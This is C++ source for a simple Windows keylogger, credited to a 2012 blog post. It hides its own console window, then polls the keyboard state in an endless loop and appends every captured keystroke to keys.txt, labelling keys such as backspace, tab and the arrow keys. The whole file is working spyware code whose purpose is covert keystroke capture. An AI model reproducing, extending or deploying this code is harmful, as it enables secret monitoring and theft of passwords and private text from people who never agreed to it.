// Original Code obtained from: http://codecompiler.wordpress.com/2012/08/15/how-to-create-keylogger-using-c/

/*

	This is a very naive approach to making a Windows Keylogger.  At this point
	there is no case support, and very little support for special key strokes, 
	such as ret, shift, ctrl, etc...

	Keystrokes are saved to .\keys.txt

*/

#include <iostream>
#include <windows.h>

int write( int key_stroke );

void hide(){
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth,0);
}

 
int main( int argc, char* argv[] ){
	unsigned char key;
	hide();
	while (1)
	{
		for(key = 8; key <= 190; key++){
			if (GetAsyncKeyState(key) == -32767){
				write (key);
			}
		}
	}
	return 0;
}

int write(int key_stroke){

	if ( (key_stroke == 1) || (key_stroke == 2) )
		return 0;
 
	int e;
	FILE *fout;

	e = fopen_s(&fout, "keys.txt", "a+");
	if(e)	// If the file can't be opened, a ret code is stashed in e.
		return 0;
 
	if (key_stroke == 8)
		fprintf(fout, "%s", "[BACKSPACE]");
	else if (key_stroke == 13)
		fprintf(fout, "%s", "\n");
	else if (key_stroke == 32)
		fprintf(fout, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(fout, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(fout, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(fout, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(fout, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(fout, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(fout, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(fout, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(fout, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(fout, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(fout, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(fout, "%s", ".");
	else
		fprintf(fout, "%s", &key_stroke);
	fflush(fout);
	fclose (fout);
	return 0;
}
 
